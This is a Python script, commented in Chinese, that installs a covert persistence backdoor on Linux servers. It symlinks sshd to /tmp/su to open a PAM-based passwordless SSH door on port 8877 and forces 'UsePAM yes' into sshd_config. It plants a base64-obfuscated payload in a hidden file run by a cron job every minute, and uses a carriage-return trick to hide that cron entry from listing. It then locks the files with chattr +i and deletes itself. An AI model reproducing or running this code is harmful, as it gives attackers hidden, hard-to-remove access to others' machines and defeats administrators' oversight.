# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import os, sys
import base64

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def check_py():
    if sys.version_info.major == 3:
        print("当前运行的是 Python 3 版本。")
        ret = '3'
    elif sys.version_info.major == 2:
        print("当前运行的是 Python 2 版本。")
        ret = '2'
    else:
        print("未知的 Python 版本。")
        ret = ' '
    return ret


def etc_crontab(shell, file_path):
    py = check_py()
    with open(file_path, 'w') as file:
        file.write(shell)

    command = '(crontab -l;printf "*/1 * * * * ' + ' python' + py + ' ' + file_path + ';\\rno crontab for `whoami` %100c\\n")|crontab -'
    ml(command)

    if os.path.exists(file_path):
        print("Yes----crontab计划任务写入成功")
    else:
        print("No----crontab计划任务写入失败")


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def check_uac(port):
    command = 'cat /etc/ssh/sshd_config|grep UsePAM'
    j = ml(command)
    if 'UsePAM yes' in j:
        print('可以使用crontab&SSH后门，使用ps -aux关闭连接，删除/tmp/su文件')
    else:
        print('正在开启UsePAM')
        try:
            miyue('UsePAM yes')
        except Exception as e:
            print('权限出现错误,配置文件写入失败')
        print('可以使用crontab&SSH后门，使用ps -aux关闭连接，删除/tmp/su文件')
    user = ml('whoami').strip()
    print('------>连接命令为:ssh ' + str(user) + '@ip -p ' + str(port)+'<------')


def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除" + script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)

def base64_encode(input_string):
    if isinstance(input_string, str):
        input_bytes = input_string.encode('utf-8', 'ignore')
    else:
        input_bytes = input_string
    encoded_bytes = base64.b64encode(input_bytes)
    encoded_string = encoded_bytes.decode('utf-8')
    return encoded_string

if __name__ == '__main__':
    port = "8877"
    shell1 = """# !/usr/bin/env python
import subprocess

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  
    stdout, stderr = process.communicate()  
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout

def lis():
    if 'i' in ml('lsattr /tmp/su'):
        command = 'chattr -i /tmp/su'
        ml(command)

if __name__ == '__main__':
    port = """ + port + """
    j = ml('ps -aux')
    result = '/tmp/su -oPort=' + str(port)
    if not result in j:
        lis()
        command = 'ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=' + str(port)
        ml(command)
    """
    check_uac(port)
    encoded_string = base64_encode(shell1)
    shell = """# !/usr/bin/env python
import subprocess
import base64
import os
encoded_string='"""+str(encoded_string)+"""'
def base64_decode(encoded_string):
    decoded_bytes = base64.b64decode(encoded_string)
    return decoded_bytes
def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  
    stdout, stderr = process.communicate()  
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout
def run_code(decoded_bytes):
    try:
        decoded_string = decoded_bytes.decode('utf-8')
        exec(decoded_string)
    except Exception as e:
        exec(decoded_bytes)
decoded_bytes = base64_decode(encoded_string)
run_code(decoded_bytes)
        """
    file_path = "/tmp/.11"
    etc_crontab(shell, file_path)
    ml('ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=' + str(port))
    ml('chattr +i /var/spool/cron/')
    ml('chattr +i ' + file_path)
    ml('chattr +i /tmp/su')
    delete_current_script()  # 删除当前执行脚本文件
